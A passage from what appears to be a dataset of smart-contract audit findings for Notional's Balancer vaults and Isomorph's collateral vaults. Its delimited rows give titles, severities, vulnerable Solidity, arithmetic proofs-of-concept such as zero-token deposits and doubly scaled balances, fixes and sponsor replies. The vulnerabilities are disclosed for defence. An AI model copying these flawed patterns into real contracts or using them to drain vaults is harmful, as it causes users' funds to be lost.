ComposableBoostedPool due to rounding differences. The spot price is used to verify if the pool has been manipulated before executing certain key vault actions (e.g. settle vault, reinvest rewards). In the worst-case scenario, it might potentially fail to detect the pool has been manipulated as the spot price computed might be inaccurate.\nThe Boosted3Token leverage vault relies on the old version of the `StableMath._calculateInvariant` that allows the caller to specify if the computation should round up or down via the `roundUp` parameter.\nWithin the `Boosted3TokenPoolUtils._getSpotPrice` and `Boosted3TokenPoolUtils._getValidatedPoolData` functions, the `StableMath._calculateInvariant` is computed rounding up.\nHowever, Balancer has since migrated its Boosted3Token pool from the legacy BoostedPool structure to a new ComposableBoostedPool contract.\nThe new ComposableBoostedPool contract uses a newer version of the StableMath library where the `StableMath._calculateInvariant` function always rounds down.\nhttps://etherscan.io/address/0xa13a9247ea42d743238089903570127dda72fe44#code#F16#L57\n```\n    function _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n        internal\n        pure\n        returns (uint256)\n    {\n        /**********************************************************************************************\n        // invariant                                                                                 //\n        // D = invariant                                                  D^(n+1)                    //\n        // A = amplification coefficient      A  n^n S + D = A D n^n + -----------                   //\n        // S = sum of balances                                             n^n P                     //\n        // P = product of balances                                                                   //\n        // n = number of tokens                                                                      //\n        **********************************************************************************************/\n\n        // Always round down, to match Vyper's arithmetic (which always truncates).\n\n        uint256 sum = 0; // S in the Curve version\n        uint256 numTokens = balances.length;\n        for (uint256 i = 0; i < numTokens; i++) {\n            sum = sum.add(balances[i]);\n        }\n        if (sum == 0) {\n            return 0;\n        }\n        ..SNIP..\n```\n\nThus, Notional round up when calculating the invariant while Balancer's ComposableBoostedPool round down when calculating the invariant. This inconsistency will result in a different invariantчTo avoid any discrepancy in the result, ensure that the StableMath library used by Balancer's ComposableBoostedPool and Notional's Boosted3Token leverage vault are aligned, and the implementation of the StableMath functions is the same between them.\nDiscussion\nweitianjie2000\nvalid, will fixчThe invariant is used to compute the spot price to verify if the pool has been manipulated before executing certain key vault actions (e.g. settle vault, reinvest rewards). If the inputted invariant is inaccurate, the spot price computed might not be accurate and might not match the actual spot price of the Balancer Pool. In the worst-case scenario, it might potentially fail to detect the pool has been manipulated and the trade proceeds to execute against the manipulated pool leading to a loss of assets.\nCode Snippet\nTool used\nManual Review
Users deposit assets to the vault but receives no strategy token in returnчhighч```\nint256 internal constant INTERNAL_TOKEN_PRECISION = 1e8;\nuint256 internal constant BALANCER_PRECISION = 1e18;\n```\nчDue to a rounding error in Solidity, it is possible that a user deposits assets to the vault, but receives no strategy token in return due to issues in the following functions:\nStrategyUtils._convertBPTClaimToStrategyTokens\nBoosted3TokenPoolUtils._deposit\nTwoTokenPoolUtils._deposit\nThis affects both the TwoToken and Boosted3Token vaults\n```\nint256 internal constant INTERNAL_TOKEN_PRECISION = 1e8;\nuint256 internal constant BALANCER_PRECISION = 1e18;\n```\n\nWithin the `StrategyUtils._convertBPTClaimToStrategyTokens` function, it was observed that the numerator precision (1e8) is much smaller than the denominator precision (1e18).\nAs a result, the `StrategyUtils._convertBPTClaimToStrategyTokens` function might return zero strategy tokens under the following two conditions:\nIf the `totalBPTHeld` is zero (First Deposit)\nIf the `totalBPTHeld` is zero, the code at Line 31 will be executed, and the following formula is used:\n```\nstrategyTokenAmount = (bptClaim * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / BalancerConstants.BALANCER_PRECISION;\nstrategyTokenAmount = (bptClaim * 1e8) / 1e18\nstrategyTokenAmount = ((10 ** 10 - 1) * 1e8) / 1e18 = 0\n```\n\nDuring the first deposit, if the user deposits less than 1e10 BPT, Solidity will round down and `strategyTokenAmount` will be zero.\nIf the `totalBPTHeld` is larger than zero (Subsequently Deposits)\nIf the `totalBPTHeld` is larger than zero, the code at Line 38 will be executed, and the following formula is used:\n```\nstrategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.vaultState.totalBPTHeld;\nstrategyTokenAmount = (bptClaim * (x * 1e8))/ (y * 1e18)\n```\n\nIf the numerator is less than the denominator, the `strategyTokenAmount` will be zero.\nTherefore, it is possible that the users deposited their minted BPT to the vault, but received zero strategy tokens in return.\nProof-of-Concept\nAssume that Alice is the first depositor, and she forwarded 10000 BPT. During the first mint, the strategy token will be minted in a 1:1 ratio. Therefore, Alice will receive 10000 strategy tokens in return. At this point in time, `totalStrategyTokenGlobal` = 10000 strategy tokens and `totalBPTHeld` is 10000 BPT.\nWhen Bob deposits to the vault after Alice, he will be subjected to the following formula:\n```\nstrategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.vaultState.totalBPTHeld;\nstrategyTokenAmount = (bptClaim * (10000 * 1e8))/ (10000 * 1e18)\nstrategyTokenAmount = (bptClaim * (1e12))/ (1e22)\n```\n\nIf Bob deposits less than 1e10 BPT, Solidity will round down and `strategyTokenAmount` will be zero. Bob will receive no strategy token in return for his BPT.\nAnother side effect of this issue is that if Alice withdraws all her strategy tokens, she will get back all her 10000 BPT plus the BPT that Bob deposited earlier.ч"Consider reverting if zero strategy token is minted. This check has been implemented in many well-known vault designs as this is a commonly known issue (e.g. Solmate)\n```\nfunction _deposit(\n    ThreeTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    BoostedOracleContext memory oracleContext,\n    uint256 deposit,\n    uint256 minBPT\n) internal returns (uint256 strategyTokensMinted) {\n    uint256 bptMinted = poolContext._joinPoolAndStake({\n        strategyContext: strategyContext,\n        stakingContext: stakingContext,\n        oracleContext: oracleContext,\n        deposit: deposit,\n        minBPT: minBPT\n    });\n\n    strategyTokensMinted = strategyContext._convertBPTClaimToStrategyTokens(bptMinted);\n// Add the line below\n require(strategyTokensMinted != 0, ""zero strategy token minted"");    \n\n    strategyContext.vaultState.totalBPTHeld // Add the line below\n= bptMinted;\n    // Update global supply count\n    strategyContext.vaultState.totalStrategyTokenGlobal // Add the line below\n= strategyTokensMinted.toUint80();\n    strategyContext.vaultState.setStrategyVaultState(); \n}\n```\n\nDiscussion\nweitianjie2000\nvalid, will fix"чLoss of assets for the users as they deposited their assets but receive zero strategy tokens in return.\nCode Snippet\nTool used\nManual Review
Token amounts are scaled up twice causing the amounts to be inflated in two token vaultчhighч```\n    /**\n     * @dev Overrides scaling factor getter to introduce the tokens' price rate.\n     * Note that it may update the price rate cache if necessary.\n     */\n    function _scalingFactors() internal view virtual override returns (uint256[] memory scalingFactors) {\n        // There is no need to check the arrays length since both are based on `_getTotalTokens`\n        // Given there is no generic direction for this rounding, it simply follows the same strategy as the BasePool.\n        scalingFactors = super._scalingFactors();\n        scalingFactors[0] = scalingFactors[0].mulDown(_priceRate(_token0));\n        scalingFactors[1] = scalingFactors[1].mulDown(_priceRate(_token1));\n    }\n```\nчToken amounts are scaled up twice causing the amounts to be inflated in two token vault when performing computation. This in turn causes the reinvest function to break leading to a loss of assets for vault users, and the value of their strategy tokens will be struck and will not appreciate.\nIn Line 121-124, the `primaryAmount` and `secondaryAmount` are scaled up to `BALANCER_PRECISION` (1e18). The reason for doing so is that balancer math functions expect all amounts to be in `BALANCER_PRECISION` (1e18).\nThen, the scaled `primaryAmount` and `secondaryAmount` are passed into the `_getSpotPrice` function at Line 126.\nWithin the `_getSpotPrice` function, the `primaryBalance` and `secondaryBalance` are scaled up again at Line 25 - 28. As such, any token (e.g. USDC) with a decimal of less than `BALANCER_PRECISION` (1e18) will be scaled up twice. This will cause the `balanceX` or `balanceY` to be inflated.\nBalancer's Scaling Factors\nIt is important to know the underlying mechanism of scaling factors within Balancer to understand this issue.\nWithin Balancer, all stable math calculations within the Balancer's pools are performed in 1e18. Thus, before passing the token balances to the stable math functions, all the balances need to be normalized to 18 decimals.\nFor instance, assume that 100 USDC needs to be passed into the stable math functions for some computation. 100 USDC is equal to `100e6` since the decimals of USDC is `6`. To normalize it to 18 decimals, 100 USDC (100e6) will be multiplied by its scaling factor (1e12), and the result will be `100e18`.\nThe following code taken from Balancer shows that the scaling factor is comprised of the scaling factor multiplied by the token rate. The scaling factor is the value needed to normalize the token balance to 18 decimals.\nhttps://etherscan.io/address/0x32296969Ef14EB0c6d29669C550D4a0449130230#code\n```\n    /**\n     * @dev Overrides scaling factor getter to introduce the tokens' price rate.\n     * Note that it may update the price rate cache if necessary.\n     */\n    function _scalingFactors() internal view virtual override returns (uint256[] memory scalingFactors) {\n        // There is no need to check the arrays length since both are based on `_getTotalTokens`\n        // Given there is no generic direction for this rounding, it simply follows the same strategy as the BasePool.\n        scalingFactors = super._scalingFactors();\n        scalingFactors[0] = scalingFactors[0].mulDown(_priceRate(_token0));\n        scalingFactors[1] = scalingFactors[1].mulDown(_priceRate(_token1));\n    }\n```\n\nAnother point to note is that Balancer's stable math functions perform calculations in fixed point format. Therefore, the scaling factor will consist of the `FixedPoint.ONE` (1e18) multiplied by the value needed to normalize the token balance to 18 decimals. If it is a USDC with 6 decimals, the scaling factor will be 1e30:\n```\nFixedPoint.ONE * 10**decimalsDifference\n1e18 * 1e12 = 1e30\n```\n\nhttps://etherscan.io/address/0x32296969Ef14EB0c6d29669C550D4a0449130230#code\n```\n    /**\n     * @dev Returns a scaling factor that, when multiplied to a token amount for `token`, normalizes its balance as if\n     * it had 18 decimals.\n     */\n    function _computeScalingFactor(IERC20 token) internal view returns (uint256) {\n        // Tokens that don't implement the `decimals` method are not supported.\n        uint256 tokenDecimals = ERC20(address(token)).decimals();\n\n        // Tokens with more than 18 decimals are not supported.\n        uint256 decimalsDifference = Math.sub(18, tokenDecimals);\n        return FixedPoint.ONE * 10**decimalsDifference;\n    }\n```\n\nProof-of-Concept\nAssume that one of the tokens in Notional's two token leverage vault has a decimal of less than 18. Let's take USDC as an example.\n100 USDC (1e6) is passed into the `_validateSpotPriceAndPairPrice` function as the `primaryAmount`. In Line 121-124 of the `_validateSpotPriceAndPairPrice` function, the `primaryAmount` will be scaled up to `BALANCER_PRECISION` (1e18).\n`primaryAmount` = `primaryAmount` * BalancerConstants.BALANCER_PRECISION / primaryPrecision;\n`primaryAmount` = 100e6 * 1e18 / 1e6\n`primaryAmount` = 100e18\nWithin the `_getSpotPrice` function, the `primaryBalance` is scaled up again at Line 25 - 28 of the `_getSpotPrice` function.\nscaledPrimaryBalance = `primaryBalance` * poolContext.primaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\nscaledPrimaryBalance = 100e18 * 1e30 / 1e18\nscaledPrimaryBalance = 1e30\nscaledPrimaryBalance = 1000000000000e18\nAs shown above, normalized 100 USDC (100e18) ended up becoming normalized 1000000000000 USDC (1000000000000e18). Therefore, the stable math functions are computed with an inflated balance of 1000000000000 USDC instead of 100 USDC.ч
Users redeem strategy tokens but receives no assets in returnчhighч```\nint256 internal constant INTERNAL_TOKEN_PRECISION = 1e8;\nuint256 internal constant BALANCER_PRECISION = 1e18;\n```\nч"Due to a rounding error in Solidity, it is possible that a user burns their strategy tokens, but receives no assets in return due to issues in the following functions:\nStrategyUtils._convertStrategyTokensToBPTClaim\nBoosted3TokenPoolUtils._redeem\nTwoTokenPoolUtils._redeem\nThis affects both the TwoToken and Boosted3Token vaults\n```\nint256 internal constant INTERNAL_TOKEN_PRECISION = 1e8;\nuint256 internal constant BALANCER_PRECISION = 1e18;\n```\n\nWithin the `StrategyUtils._convertStrategyTokensToBPTClaim` function, it was observed that if the numerator is smaller than the denominator, the `bptClaim` will be zero.\nWhen the `bptClaim` is zero, the function returns zero instead of reverting. Therefore, it is possible that a user redeems (""burns"") their strategy tokens, but receives no assets in return because the number of strategy tokens redeemed by the user is too small."ч"
Scaling factor of the wrapped token is incorrectчhighч```\nscalingFactors[_wrappedIndex] = _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate());\n```\nчThe scaling factor of the wrapped token within the Boosted3Token leverage vault is incorrect. Thus, all the computations within the leverage vault will be incorrect. This leads to an array of issues such as users being liquidated prematurely or users being able to borrow more than they are allowed to.\nIn Line 120, it calls the `getScalingFactors` function of the LinearPool to fetch the scaling factors of the LinearPool.\nIn Line 123, it computes the final scaling factor of the wrapped token by multiplying the main token's decimal scaling factor with the wrapped token rate, which is incorrect.\nThe correct way of calculating the final scaling factor of the wrapped token is to multiply the wrapped token's decimal scaling factor by the wrapped token rate as shown below:\n```\nscalingFactors[_wrappedIndex] = _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate());\n```\n\nThe `_scalingFactorWrappedToken` is the scaling factor that, when multiplied to a token amount, normalizes its balance as if it had 18 decimals. The `_getWrappedTokenRate` function returns the wrapped token rate.\nIt is important to note that the decimal scaling factor of the main and wrapped tokens are not always the same. Thus, they cannot be used interchangeably.\n```\n    // Scaling factors\n\n    function _scalingFactor(IERC20 token) internal view virtual returns (uint256) {\n        if (token == _mainToken) {\n            return _scalingFactorMainToken;\n        } else if (token == _wrappedToken) {\n            // The wrapped token's scaling factor is not constant, but increases over time as the wrapped token\n            // increases in value.\n            return _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate());\n        } else if (token == this) {\n            return FixedPoint.ONE;\n        } else {\n            _revert(Errors.INVALID_TOKEN);\n        }\n    }\n\n    /**\n     * @notice Return the scaling factors for all tokens, including the BPT.\n     */\n    function getScalingFactors() public view virtual override returns (uint256[] memory) {\n        uint256[] memory scalingFactors = new uint256[](_TOTAL_TOKENS);\n\n        // The wrapped token's scaling factor is not constant, but increases over time as the wrapped token increases in\n        // value.\n        scalingFactors[_mainIndex] = _scalingFactorMainToken;\n        scalingFactors[_wrappedIndex] = _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate());\n        scalingFactors[_BPT_INDEX] = FixedPoint.ONE;\n\n        return scalingFactors;\n    }\n```\nчThere is no need to manually calculate the final scaling factor of the wrapped token again within the code. This is because the wrapped token scaling factor returned by the `LinearPool.getScalingFactors()` function already includes the token rate. Refer to the Balancer's source code above for referen\n```\nfunction _underlyingPoolContext(ILinearPool underlyingPool) private view returns (UnderlyingPoolContext memory) {\n    (uint256 lowerTarget, uint256 upperTarget) = underlyingPool.getTargets();\n    uint256 mainIndex = underlyingPool.getMainIndex();\n    uint256 wrappedIndex = underlyingPool.getWrappedIndex();\n\n    (\n        /* address[] memory tokens */,\n        uint256[] memory underlyingBalances,\n        /* uint256 lastChangeBlock */\n    ) = Deployments.BALANCER_VAULT.getPoolTokens(underlyingPool.getPoolId());\n\n    uint256[] memory underlyingScalingFactors = underlyingPool.getScalingFactors();\n// Remove the line below\n   // The wrapped token's scaling factor is not constant, but increases over time as the wrapped token increases in\n// Remove the line below\n   // value.\n// Remove the line below\n   uint256 wrappedScaleFactor = underlyingScalingFactors[mainIndex] * underlyingPool.getWrappedTokenRate() /\n// Remove the line below\n       BalancerConstants.BALANCER_PRECISION;\n\n    return UnderlyingPoolContext({\n        mainScaleFactor: underlyingScalingFactors[mainIndex],\n        mainBalance: underlyingBalances[mainIndex],\n// Remove the line below\n       wrappedScaleFactor: wrappedScaleFactor,\n// Add the line below\n       wrappedScaleFactor: underlyingScalingFactors[wrappedIndex],        \n        wrappedBalance: underlyingBalances[wrappedIndex],\n        virtualSupply: underlyingPool.getVirtualSupply(),\n        fee: underlyingPool.getSwapFeePercentage(),\n        lowerTarget: lowerTarget,\n        upperTarget: upperTarget    \n    });\n}\n```\n\nDiscussion\nweitianjie2000\nvalid, will fixчWithin the Boosted 3 leverage vault, the balances are scaled before passing them to the stable math function for computation since the stable math function only works with balances that have been normalized to 18 decimals. If the scaling factor is incorrect, all the computations within the leverage vault will be incorrect, which affects almost all the vault functions.\nFor instance, the `Boosted3TokenAuraVault.convertStrategyToUnderlying` function relies on the wrapped scaling factor for its computation under the hood. This function is utilized by Notional's `VaultConfiguration.calculateCollateralRatio` function to determine the value of the vault share when computing the collateral ratio. If the underlying result is wrong, the collateral ratio will be wrong too, and this leads to an array of issues such as users being liquidated prematurely or users being able to borrow more than they are allowed to.\nCode Snippet\nTool used\nManual Review
Possible division by zero depending on `TradingModule.getOraclePrice` return valuesчmediumч```\n        require(oraclePrice >= 0); /// @dev Chainlink rate error\n```\nчSome functions depending on `TradingModule.getOraclePrice` accept non-negative `(int256 `answer`, int256 decimals)` return values. In case any of those are equal to zero, division depending on `answer` or `decimals` will revert. In the worst case scenario, this will prevent the protocol from continuing operating.\nThe function `TradingModule.getOraclePrice` properly validates that return values from Chainlink price feeds are positive.\nNevertheless, `answer` may currently return zero, as it is calculated as `(basePrice * quoteDecimals * RATE_DECIMALS) / (quotePrice * baseDecimals);`, which can be truncated down to zero, depending on base/quote prices [1]. Additionally, `decimals` may in the future return zero, depending on changes to the protocol code, as the NatSpec states that this is a number of `decimals` in the rate, currently hardcoded to 1e18 [2].\nIf any of these return values are zero, calculations that use division depending on `TradingModule.getOraclePrice` will revert.\nMore specifically:\n[1]\n1.1 `TradingModule.getLimitAmount`\n```\n        require(oraclePrice >= 0); /// @dev Chainlink rate error\n```\n\nthat calls `TradingUtils._getLimitAmount`, which reverts if `oraclePrice` is `0`\n```\n            oraclePrice = (oracleDecimals * oracleDecimals) / oraclePrice;\n```\n\n[2] 2.1 `TwoTokenPoolUtils._getOraclePairPrice`\n```\n            require(decimals >= 0);\n\n            if (uint256(decimals) != BalancerConstants.BALANCER_PRECISION) {\n                rate = (rate * int256(BalancerConstants.BALANCER_PRECISION)) / decimals;\n            }\n```\n\n2.2 `TradingModule.getLimitAmount`\n```\n        require(oracleDecimals >= 0); /// @dev Chainlink decimals error\n```\n\nthat calls `TradingUtils._getLimitAmount`, which reverts if `oracleDecimals` is `0`\n```\n            limitAmount =\n                ((oraclePrice + \n                    ((oraclePrice * uint256(slippageLimit)) /\n                        Constants.SLIPPAGE_LIMIT_PRECISION)) * amount) / \n                oracleDecimals;\n```\n\n2.3 `CrossCurrencyfCashVault.convertStrategyToUnderlying`\n```\n        return (pvInternal * borrowTokenDecimals * rate) /\n            (rateDecimals * int256(Constants.INTERNAL_TOKEN_PRECISION));\n```\nч
Lyra vault underestimates the collateral valueчmediumч```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n        //The LiquidityPool associated with the LP Token is used for pricing\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    //we have already checked for stale greeks so here we call the basic price function.\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();\n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue  = (_amount * tokenPrice) / LOAN_SCALE;\n    //we remove the Liquidity Pool withdrawalFee\n    //as there's no way to remove the LP position without paying this.\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE- withdrawalFee)/LOAN_SCALE;\n    return(USDValueAfterFee);\n}\n```\nчLyra vault subtracts the withdrawal fee while calculating the collateral value in USD, and it does not match the actual Lyra Pool implementation.\n```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n        //The LiquidityPool associated with the LP Token is used for pricing\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    //we have already checked for stale greeks so here we call the basic price function.\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();\n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue  = (_amount * tokenPrice) / LOAN_SCALE;\n    //we remove the Liquidity Pool withdrawalFee\n    //as there's no way to remove the LP position without paying this.\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE- withdrawalFee)/LOAN_SCALE;\n    return(USDValueAfterFee);\n}\n```\n\nSo it is understood that the withdrawal fee is removed to get the reasonable value of the collateral. But according to the Lyra Pool implementation, the token price used for withdrawal is calculated using the function `_getTotalBurnableTokens`. And the function `_getTotalBurnableTokens` is as belows.\n```\nfunction _getTotalBurnableTokens()\n    internal\n    returns (\n      uint tokensBurnable,\n      uint tokenPriceWithFee,\n      bool stale\n    )\n  {\n    uint burnableLiquidity;\n    uint tokenPrice;\n    (tokenPrice, stale, burnableLiquidity) = _getTokenPriceAndStale();\n\n    if (optionMarket.getNumLiveBoards() != 0) {\n      tokenPriceWithFee = tokenPrice.multiplyDecimal(DecimalMath.UNIT - lpParams.withdrawalFee);\n    } else {\n      tokenPriceWithFee = tokenPrice;//@audit withdrawalFee is not applied if there are no live borads\n    }\n\n    return (burnableLiquidity.divideDecimal(tokenPriceWithFee), tokenPriceWithFee, stale);\n  }\n```\nчMake sure to apply withdrawal fee consistent to how Lyra pool does.\nDiscussion\nkree-dotcom\nSponsor confirmed, will fix\nkree-dotcom\nCurrently this fix looks like it will be quite a lot of alterations. If there is time and it doesn't introduce too many changes for Sherlock to check we will try to fix it.\nThe reason is the call added must be made to the optionMarket contract of each collateral, this address is stored as an internal address in liquidityPool and other contracts, therefore to access it we must add another field to Lyra collateral in the collateral book, this would involve altering all collateralBook functions to expect another field as well as other vaults and systems to adhere to this larger model.\nAlternatively we can add another mapping to the Vault_Lyra to store the OptionsMarkets and an admin only function to add new ones but this feels like poor design.\nLeaving this issue unfixed is unlikely to cause large problems. LiquidityTokens should only have zero live boards if an optionMarket is closed (usually to be depreciated) with zero live boards the collateral should be earning no interest for the owner and therefore they would likely desire to close their loan and redeem their collateral and so not be in a situation to be liquidated.чUser's collaterals are under-valued than reasonable and might get to a liquidatable status sooner than expected. A liquidator can abuse this to get an unfair profit by liquidating the user's collateral with the under-estimated value and withdrawing it from the Lyra pool without paying a withdrawal fee.\nCode Snippet\nTool used\nManual Review
priceLiquidity() may not work if PriceFeed.aggregator() is updatedчmediumч"```\n        IAccessControlledOffchainAggregator  aggregator = IAccessControlledOffchainAggregator(priceFeed.aggregator());\n        //fetch the pricefeeds hard limits so we can be aware if these have been reached.\n        tokenMinPrice = aggregator.minAnswer();\n        tokenMaxPrice = aggregator.maxAnswer();\n// rest of code\n            uint256 oraclePrice = getOraclePrice(priceFeed, tokenMaxPrice, tokenMinPrice);\n// rest of code\n    function getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256 ) {\n        (\n            /*uint80 roundID*/,\n            int signedPrice,\n            /*uint startedAt*/,\n            uint timeStamp,\n            /*uint80 answeredInRound*/\n        ) = _priceFeed.latestRoundData();\n        //check for Chainlink oracle deviancies, force a revert if any are present. Helps prevent a LUNA like issue\n        require(signedPrice > 0, ""Negative Oracle Price"");\n        require(timeStamp >= block.timestamp - HEARTBEAT_TIME , ""Stale pricefeed"");\n        require(signedPrice < _maxPrice, ""Upper price bound breached"");\n        require(signedPrice > _minPrice, ""Lower price bound breached"");\n```\n"ч"priceLiquidity() may not work if PriceFeed.aggregator() is updated\nIn the constructor of the DepositReceipt_* contract, the value of minAnswer/maxAnswer in priceFeed.aggregator() is obtained and assigned to *MinPrice/*MaxPrice as the maximum/minimum price limit when calling the getOraclePrice function in priceLiquidity, and *MinPrice/*MaxPrice can not change.\n```\n        IAccessControlledOffchainAggregator  aggregator = IAccessControlledOffchainAggregator(priceFeed.aggregator());\n        //fetch the pricefeeds hard limits so we can be aware if these have been reached.\n        tokenMinPrice = aggregator.minAnswer();\n        tokenMaxPrice = aggregator.maxAnswer();\n// rest of code\n            uint256 oraclePrice = getOraclePrice(priceFeed, tokenMaxPrice, tokenMinPrice);\n// rest of code\n    function getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256 ) {\n        (\n            /*uint80 roundID*/,\n            int signedPrice,\n            /*uint startedAt*/,\n            uint timeStamp,\n            /*uint80 answeredInRound*/\n        ) = _priceFeed.latestRoundData();\n        //check for Chainlink oracle deviancies, force a revert if any are present. Helps prevent a LUNA like issue\n        require(signedPrice > 0, ""Negative Oracle Price"");\n        require(timeStamp >= block.timestamp - HEARTBEAT_TIME , ""Stale pricefeed"");\n        require(signedPrice < _maxPrice, ""Upper price bound breached"");\n        require(signedPrice > _minPrice, ""Lower price bound breached"");\n```\n\nBut in the priceFeed contract, the address of the aggregator can be changed by the owner, which may cause the value of minAnswer/maxAnswer to change, and the price limit in the DepositReceipt_* contract to be invalid, and priceLiquidity() can not work.\n```\n  function confirmAggregator(address _aggregator)\n    external\n    onlyOwner()\n  {\n    require(_aggregator == address(proposedAggregator), ""Invalid proposed aggregator"");\n    delete proposedAggregator;\n    setAggregator(_aggregator);\n  }\n\n\n  /*\n   * Internal\n   */\n\n  function setAggregator(address _aggregator)\n    internal\n  {\n    uint16 id = currentPhase.id + 1;\n    currentPhase = Phase(id, AggregatorV2V3Interface(_aggregator));\n    phaseAggregators[id] = AggregatorV2V3Interface(_aggregator);\n  }\n  // rest of code\n    function aggregator()\n    external\n    view\n    returns (address)\n  {\n    return address(currentPhase.aggregator);\n  }\n```\n"ч"Consider getting latest priceFeed.aggregator().minAnswer()/maxAnswer() in priceLiquidity()\nDiscussion\nkree-dotcom\nSponsor confirmed, will fix.\nChainlink documents state: ""you can call functions on the aggregator directly, but it is a best practice to use the AggregatorV3Interface to run functions on the proxy instead so that changes to the aggregator do not affect your application. Read the aggregator contract only if you need functions that are not available in the proxy.""\nSo the auditor is right that we should not assume the AccessControlledOffchainAggregator is static. We will move these calls to occur on every call rather than in setup.\nkree-dotcom\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/58b8f3e14b416630971b7b17b500bbe22d2016aa\nNote there are two fixes in this commit relating to the priceLiquidity function. the other issue is #72 , the code for these changes doesn't overlap so should be clear, please ask me if it is not."чCode Snippet\nTool used\nManual Review
Vault_Synths.sol code does not consider protocol exchange fee when evaluating the Collateral worthчmediumч```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n     //The LiquidityPool associated with the LP Token is used for pricing\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    //we have already checked for stale greeks so here we call the basic price function.\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();          \n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue  = (_amount * tokenPrice) / LOAN_SCALE;\n    //we remove the Liquidity Pool withdrawalFee \n    //as there's no way to remove the LP position without paying this.\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE- withdrawalFee)/LOAN_SCALE;\n    return(USDValueAfterFee);\n}\n```\nчIf we look into the good-written documentation:\nhttps://github.com/kree-dotcom/isomorph/blob/789338c8979ab75b8187781a2500908bb26dcdea/docs/Vault_Lyra.md#getwithdrawalfee\nI want to quote:\nBecause the withdrawalFee of a lyra LP pool can vary we must fetch it each time it is needed to ensure we use an accurate value. LP tokens are devalued by this as a safety measure as any liquidation would include selling the collateral and so should factor in that cost to ensure it is profitable.\n```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n     //The LiquidityPool associated with the LP Token is used for pricing\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    //we have already checked for stale greeks so here we call the basic price function.\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();          \n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue  = (_amount * tokenPrice) / LOAN_SCALE;\n    //we remove the Liquidity Pool withdrawalFee \n    //as there's no way to remove the LP position without paying this.\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE- withdrawalFee)/LOAN_SCALE;\n    return(USDValueAfterFee);\n}\n```\n\nhttps://docs.synthetix.io/incentives/#exchange-fees\nExchange fees are generated whenever a user exchanges one synthetic asset (Synth) for another through Synthetix.Exchange. Fees are typically between 10-100 bps (0.1%-1%), though usually 30 bps, and when generated are sent to the fee pool, where it is available to be claimed proportionally by SNX stakers each week.\nIf we go to https://synthetix.io/synths,\nwe can see that the sETH token charges 0.25%, the sBTC token charges 0.25%, the sUSD charges 0% fee, but this does not ensure this fee rate will not change in the future.ч"Precisely when the exchange fee is updated, the fee is reflected in the collateral worth.\n```\n    function setExchangeFeeRateForSynths(bytes32[] calldata synthKeys, uint256[] calldata exchangeFeeRates)\n        external\n        onlyOwner\n    {\n        flexibleStorage().setExchangeFeeRateForSynths(SETTING_EXCHANGE_FEE_RATE, synthKeys, exchangeFeeRates);\n        for (uint i = 0; i < synthKeys.length; i++) {\n            emit ExchangeFeeUpdated(synthKeys[i], exchangeFeeRates[i]);\n        }\n    }\n\n    /// @notice Set exchange dynamic fee threshold constant in decimal ratio\n    /// @param threshold The exchange dynamic fee threshold\n    /// @return uint threshold constant\n    function setExchangeDynamicFeeThreshold(uint threshold) external onlyOwner {\n        require(threshold != 0, ""Threshold cannot be 0"");\n\n        flexibleStorage().setUIntValue(SETTING_CONTRACT_NAME, SETTING_EXCHANGE_DYNAMIC_FEE_THRESHOLD, threshold);\n\n        emit ExchangeDynamicFeeThresholdUpdated(threshold);\n    }\n```\n\nDiscussion\nkree-dotcom\nSPonsor confirmed, will fix"чThe collateral may be overvalued because the exchange does not count when evaluating the Collateral worth and result in bad debt which makes the project insolvent.\nCode Snippet\nTool used\nManual Review
